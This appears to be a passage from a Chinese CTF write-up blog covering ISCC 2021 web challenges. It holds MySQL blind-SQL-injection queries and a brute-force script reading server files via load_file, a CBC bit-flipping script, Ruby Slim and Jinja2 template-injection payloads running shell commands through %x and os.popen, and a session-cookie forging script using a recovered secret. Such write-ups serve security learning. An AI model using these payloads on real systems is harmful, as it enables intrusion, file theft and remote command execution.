<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select table_name from mysql.innodb_table_stats where database_name &#x3D; database();</span><br><span class="line">select table_name from mysql.innodb_index_stats where database_name &#x3D; database();</span><br></pre></td></tr></table></figure>

<p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;包含in</span><br><span class="line">SELECT object_name FROM &#96;sys&#96;.&#96;x$innodb_buffer_stats_by_table&#96; where object_schema &#x3D; database();</span><br><span class="line">SELECT object_name FROM &#96;sys&#96;.&#96;innodb_buffer_stats_by_table&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$schema_index_statistics&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;schema_auto_increment_columns&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不包含in</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$schema_flattened_keys&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$ps_schema_table_statistics_io&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM &#96;sys&#96;.&#96;x$schema_table_statistics_with_buffer&#96; WHERE TABLE_SCHEMA &#x3D; DATABASE();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过表文件的存储路径获取表名</span><br><span class="line">SELECT FILE FROM &#96;sys&#96;.&#96;io_global_by_file_by_bytes&#96; WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM &#96;sys&#96;.&#96;io_global_by_file_by_latency&#96; WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM &#96;sys&#96;.&#96;x$io_global_by_file_by_bytes&#96; WHERE FILE REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>包含之前查询记录的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();</span><br><span class="line">SELECT QUERY FROM &#96;sys&#96;.&#96;statement_analysis&#96; where QUERY REGEXP DATABASE();</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;objects_summary_global_by_type&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_handles&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_io_waits_summary_by_index_usage&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_io_waits_summary_by_table&#96; WHERE object_schema &#x3D; DATABASE();</span><br><span class="line">SELECT object_name FROM &#96;performance_schema&#96;.&#96;table_lock_waits_summary_by_table&#96; WHERE object_schema &#x3D; DATABASE();</span><br></pre></td></tr></table></figure>

<p>包含之前查询记录的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT digest_text FROM &#96;performance_schema&#96;.&#96;events_statements_summary_by_digest&#96; WHERE digest_text REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>包含表文件路径的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT file_name FROM &#96;performance_schema&#96;.&#96;file_instances&#96; WHERE file_name REGEXP DATABASE();</span><br></pre></td></tr></table></figure>

<p>使用<code>union select</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1</span><br><span class="line">select &#96;3&#96; from(select 1,2,3 union select * from admin)a limit 1,1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;无逗号，有join版本</span><br><span class="line">select a from (select * from (select 1 &#96;a&#96;)m join (select 2 &#96;b&#96;)n join (select 3 &#96;c&#96;)t where 0 union select * from test)x;</span><br></pre></td></tr></table></figure>

<p>盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((SELECT 1,concat(&#39;&#123;result+chr(mid)&#125;&#39;, cast(&quot;0&quot; as JSON)))&lt;(SELECT * FROM &#96;f1ag_1s_h3r3_hhhhh&#96;))</span><br></pre></td></tr></table></figure>

<p>要求后面select的结果必须是一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用<code>hex</code>或者<code>binary</code>。<br> 这里只能使用<code>concat</code>将字符型和binary拼接，使之大小写敏感，<code>JSON</code>也可以使用<code>char byte</code>代替</p>
<p><code>mysql 8.0.19</code>新增语句<code>table</code><br> <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/table.html">https://dev.mysql.com/doc/refman/8.0/en/table.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>

<p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p>
<ul>
<li><code>table</code>总是显示表的所有列</li>
<li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)&gt;</span><br><span class="line">(BINARY(&#39;&#123;&#125;&#39;),&#39;0&#39;)#</span><br></pre></td></tr></table></figure>

<p>同时代替<code>select</code>被过滤导致只能同表查询的问题</p>
<p>PS：新增的<code>values</code>语句也挺有意思，在某些情况似乎可以代替<code>union</code>或<code>select</code>进行<code>order by</code>盲注</p>
<p>学习链接:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12358725.html">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>一开始听说绝对路径var/www/html然后发现读取文件的权限很高，想说直接读读源码，发现不行，于是尝试尝试自己找找绝对路径:<br>包含根目录路径的文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">&quot;http://39.96.91.106:5001/?id=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">database=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    low =<span class="number">0</span></span><br><span class="line">    high=<span class="number">264</span></span><br><span class="line">    mid=(low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        <span class="comment">#payload_1=f&quot;1/**/and/**/ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_2=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_3=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_4= f&quot;1/**/and/**/ascii(substr((select/**/value/**/from/**/flag),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span></span><br><span class="line">        <span class="comment">#payload_1=f&quot;1&#x27;and%0dascii(substr((selselectect%0dgroup_concat(table_name)%0dfrom%0dmysql.innodb_table_stats%0dwhere%0ddatabase_name%0d=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;--%0d&quot;//iscc_flag</span></span><br><span class="line">        payload_3=f<span class="string">&quot;1&#x27;and%0dascii(substr((selselectect%0dload_file(&#x27;/etc/apache2/sites-enabled/000-default.conf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;--%0d&quot;</span></span><br><span class="line">        payload_4 = f<span class="string">&quot;1&#x27;and%0dascii(substr((selselectect%0dload_file(&#x27;/var/www/const&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;--%0d&quot;</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment"># print(s.get(url+payload_1).text)</span></span><br><span class="line">        <span class="comment"># print(payload_1)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> in s.get(url+payload_3).text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">if</span>(mid==<span class="number">0</span> <span class="keyword">or</span> mid==<span class="number">264</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    database +=chr(mid)</span><br><span class="line">    <span class="keyword">print</span>(database)</span><br><span class="line"><span class="keyword">print</span>(database)</span><br></pre></td></tr></table></figure>



<h2 id="web——ISCC客服一号冲冲冲（二）"><a href="#web——ISCC客服一号冲冲冲（二）" class="headerlink" title="web——ISCC客服一号冲冲冲（二）"></a>web——ISCC客服一号冲冲冲（二）</h2><p>这题的考点在于CBC字节翻转攻击:<br>思路：他让我们登录，但是没有窗口，所以这里我们就自己post一个username和password，然后再burp回文里看到一个iv，一个cipher，想到以前做过的CBC字节翻转攻击，接下来就没啥区别了，唯一的不同的是password是客服题第一题的flag，需要替换一下，这里就贴一下脚本，具体的可以去之前的文章找找：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">cipher&#x3D;&quot;iThCcXSm90cuwxnw1KtfJqk%2Bled1cE%2Ba3xQh7UfgNovfWzCFOGmuryqdECjX1RqcLNv7ybOCRfXJBbokBfS4oKc5MnoFTbBfn5zTFdthy3E%3D&quot;</span><br><span class="line">iv&#x3D;&quot;dlp0Txccz%2Fba%2Fw0qSQGVjw%3D%3D&quot;</span><br><span class="line"></span><br><span class="line">cipher_de&#x3D;base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">tran&#x3D;&#39;a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:d&quot;;s:15:&quot;1SCC_2o2l_KeFuu&quot;&#125;8:&quot;passwor&#39;</span><br><span class="line"></span><br><span class="line">#tran[16:32]&#x3D;me&quot;;s:5:&quot;bdmin&quot;;</span><br><span class="line"></span><br><span class="line">cipher_new&#x3D;cipher_de[0:9]+chr(ord(cipher_de[9])^ord(&#39;b&#39;)^ord(&#39;a&#39;))+cipher_de[10:]</span><br><span class="line">cipher_new&#x3D;urllib.quote(base64.b64encode(cipher_new))</span><br><span class="line">print(cipher_new)</span><br><span class="line">cipher_new&#x3D;base64.b64decode(&#39;GgadNOlPvXYl8SxK+NWkK21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiIxU0NDXzJvMmxfS2VGdXUiO30&#x3D;&#39;)</span><br><span class="line">print(cipher_new)</span><br><span class="line">iv_raw&#x3D;base64.b64decode(urllib.unquote(iv))</span><br><span class="line">iv_new&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,16):</span><br><span class="line">#</span><br><span class="line">	       iv_new+&#x3D;chr(ord(tran[i])^ord(iv_raw[i])^ord(cipher_new[i]))</span><br><span class="line">iv_new&#x3D;urllib.quote(base64.b64encode(iv_new))</span><br><span class="line">print(iv_new)</span><br></pre></td></tr></table></figure>

<h2 id="web——Explore-Ruby"><a href="#web——Explore-Ruby" class="headerlink" title="web——Explore Ruby"></a>web——Explore Ruby</h2><p>一开始没注意到有提示说demo是可以登陆的，就在尝试伪造cookie（太菜了），然后登录后，发现存在ssti注入<br><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911174631687-758048107.png" alt="img" style="zoom:67%;"><br>尝试了一下 发现是slim的ruby注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;7*7&#125;</span><br></pre></td></tr></table></figure>

<p>尝试读取继承，发现没有什么有用的内容，但是发现()等内容被过滤了，于是寻找替代品</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;&#x3D;&gt;, :&#x3D;&#x3D;&#x3D;, :&#x3D;~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :&#x3D;&#x3D;, :instance_exec, :!&#x3D;, :__id__, :__send__]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;&#x3D;&gt;, :&#x3D;&#x3D;&#x3D;, :&#x3D;~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :&#x3D;&#x3D;, :instance_exec, :!&#x3D;, :__id__, :__send__]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object:47312658352300</span><br></pre></td></tr></table></figure>

<p>以上均为类继承读到的无用信息，发现几篇文章:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/watkinsong/article/details/7968550">https://blog.csdn.net/watkinsong/article/details/7968550</a><br><a target="_blank" rel="noopener" href="https://www.huaweicloud.com/articles/b5b475ca729307885cd91f03c46d4826.html">https://www.huaweicloud.com/articles/b5b475ca729307885cd91f03c46d4826.html</a></p>
<p>其中让人感兴趣的就是%x可以执行shell命令：<br>虽然中括号被过滤，但是<br><a target="_blank" rel="noopener" href="https://qastack.cn/programming/665576/what-are-those-pipe-symbols-for-in-ruby">https://qastack.cn/programming/665576/what-are-those-pipe-symbols-for-in-ruby</a></p>
<p>可以利用管道符||进行绕过，构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;%x|ls|&#125;&#x2F;&#x2F;执行了系统命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Gemfile</span><br><span class="line">Gemfile.lock</span><br><span class="line">database.db</span><br><span class="line">public</span><br><span class="line">vendor</span><br><span class="line">views</span><br><span class="line">webserver.rb</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用cat命令即可查看源码：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  set <span class="symbol">:public_folder</span>, <span class="string">&#x27;public&#x27;</span></span><br><span class="line">  set <span class="symbol">:views</span>, <span class="string">&#x27;views&#x27;</span></span><br><span class="line">  set <span class="symbol">:bind</span>, <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">  set <span class="symbol">:port</span>, <span class="number">9999</span></span><br><span class="line">  enable <span class="symbol">:sessions</span></span><br><span class="line">  set <span class="symbol">:server</span>, <span class="string">%w[thin webrick]</span></span><br><span class="line">  set <span class="symbol">:environment</span>, <span class="symbol">:production</span></span><br><span class="line">  <span class="comment">#set :environment, :development</span></span><br><span class="line">  <span class="comment">#disable :protection</span></span><br><span class="line">  set <span class="symbol">:session_secret</span>, <span class="string">&#x27;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">get <span class="string">&#x27;/home&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  authenticate!</span><br><span class="line">  @user = session[<span class="symbol">:username</span>]</span><br><span class="line">  @flag = ENV[<span class="string">&#x27;FLAG&#x27;</span>] <span class="keyword">if</span> session[<span class="symbol">:role</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">  slim <span class="symbol">:home</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>关键在这里，所以我们需要伪造admin cookie</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;uri&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;pp&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest/sha1&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;faraday&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remote host</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_hmac</span><span class="params">(data, secret)</span></span></span><br><span class="line">    OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL = &quot;http://39.96.91.106:8230/login&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Create URL object</span></span><br><span class="line"><span class="comment"># url = URI.parse(URL) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># creds = &quot;demo&quot;</span></span><br><span class="line"><span class="comment"># c = &quot;&quot;</span></span><br><span class="line"><span class="comment"># # Authentication</span></span><br><span class="line"><span class="comment"># resp = Net::HTTP.start(url.host, url.port) do |http|</span></span><br><span class="line"><span class="comment">#     http.post(url.request_uri, &quot;username=#&#123;creds&#125;&amp;password=#&#123;creds&#125;&quot;)</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line">Cookies = <span class="string">&quot;BAh7CkkiDXVzZXJuYW1lBjoGRUZJIglkZW1vBjsAVEkiCXJvbGUGOwBGSSIJ%0AdXNlcgY7AFRJIg9zZXNzaW9uX2lkBjsAVEkiRTAyMjU1OTdiMjJhYWM4Zjc3%0AYjcxZGUwNzQ2MjBlM2JiN2E5NDA1ODlmOWJjOTg5NWNiMTU3YzBlYTgyZGI5%0AYzIGOwBGSSIJY3NyZgY7AEZJIjF4MDlxTHVlOXdOZjNFWGx3T2ZzWjVXYlZ1%0ANEU5dnhBdW04TTk0Q3JZM1EwPQY7AEZJIg10cmFja2luZwY7AEZ7BkkiFEhU%0AVFBfVVNFUl9BR0VOVAY7AFRJIi00ZTRhYWEyYmFhZmVjYmIxYjcwOTViZWQ2%0AZDZmZWYzMmM3ZWI4NzEwBjsARg%3D%3D%0A--957bdf7dc19049010fd0b19e4d8656c42314b2db&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts get the cookie</span></span><br><span class="line">cookie, signature = Cookies.split(<span class="string">&quot;--&quot;</span>,<span class="number">2</span>)</span><br><span class="line">cookie = URI.decode(cookie)</span><br><span class="line"></span><br><span class="line">decoded = Base64.decode64(URI.decode(cookie))</span><br><span class="line">params = Marshal.load(decoded)</span><br><span class="line">params.merge!(&#123; <span class="string">&#x27;role&#x27;</span> =&gt;<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">print(params)</span><br><span class="line">bad_cookie = URI.encode(Base64.encode64(Marshal.dump(params)))</span><br><span class="line">bad_hmac = generate_hmac(bad_cookie, <span class="string">&quot;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&quot;</span>)</span><br><span class="line">header = <span class="string">&quot;rack.session=<span class="subst">#&#123;bad_cookie&#125;</span>--<span class="subst">#&#123;bad_hmac&#125;</span>;&quot;</span></span><br><span class="line">print(header)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>贴一下学长写的</p>
<p>在kali ruby环境下跑一下！<br>注意，需要去题目的第二个入口伪造cookie才行！！！！！！</p>
<p>接下来就可以拿到flag了</p>
<h2 id="LOVE-SSTI："><a href="#LOVE-SSTI：" class="headerlink" title="LOVE-SSTI："></a>LOVE-SSTI：</h2><p>一开始的脑洞很烦，暹罗猫那个表情包有个别名 叫小豆泥，所以注入点是?xiaodouni=</p>
<p>接下来就是常规的ssti注入了，主要是去__doc__里面取字符，由于要查找flag，所以需要一个<em>号，但是没找到\</em>，写了个脚本要找*号，但是网站似乎不让爆破==就很难受，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://39.96.91.106:3010/?xiaodouni=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers=requests.session().headers</span><br><span class="line">payload=<span class="string">&quot;&#123;%set%20a=dict(op=x,p=x)|join()%&#125;&#123;%set%20b=(()|select|string|list)|attr(a)(24)%&#125;&#123;%set%20c=(b,b,dict(doc=a)|join,b,b)|join%&#125;&#123;%set%20g=(x|attr(c)|list)|&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">    payload_fi=payload+<span class="string">f&quot;attr(a)(<span class="subst">&#123;i&#125;</span>)%&quot;</span>+<span class="string">&quot;&#125;&#123;&#123;g&#125;&#125;&quot;</span></span><br><span class="line">    url_f=url+payload_fi</span><br><span class="line">    print(s.get(url=url_f,headers=headers).text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;*&quot;</span> <span class="keyword">in</span> s.get(url=url_f,headers=headers).text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>所以就去找了一下其他方法。payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;%set a&#x3D;dict(op&#x3D;x,p&#x3D;x)|join()%&#125;&#123;%set b&#x3D;(()|select|string|list)|attr(a)(24)%&#125;&#123;%set c&#x3D;(b,b,dict(doc&#x3D;a)|join,b,b)|join%&#125;</span><br><span class="line">&#123;%set g&#x3D;(x|attr(c)|list)|attr(a)(320)%&#125;&#123;%set gl&#x3D;(b,b,dict(globals&#x3D;a)|join,b,b)|join%&#125;&#123;%set bu&#x3D;(b,b,dict(builtins&#x3D;a)|join,b,b)|join%&#125;&#123;% set cr&#x3D;(lipsum|attr(gl)|attr(&quot;get&quot;)(bu))[&quot;ch&quot;&quot;r&quot;] %&#125;&#123;%set d&#x3D;cr(42)%&#125;&#123;% set or&#x3D;(&quot;find &#x2F; -name &quot;,d,&quot;fla&quot;,d)|join%&#125;</span><br><span class="line">&#123;% set or1 &#x3D; &quot;cat &#x2F;usr&#x2F;fla??is?here?txt&quot;%&#125;&#123;&#123;(lipsum|attr(gl)|attr(&quot;get&quot;)(&quot;o&quot;&quot;s&quot;)|attr(&quot;po&quot;&quot;pen&quot;)(or1))|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>至此 web的所有题目都ak。学到了很多~</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">vague huang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/05/02/ISCCweb题解/">http://example.com/2021/05/02/ISCCweb题解/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/05/09/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fa fa-chevron-left">  </i><span>逆向入门（一）</span></a></div><div class="next-post pull-right"><a href="/2021/05/01/solidity%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AD%A6%E4%B9%A0/"><span>solidity智能合约学习</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>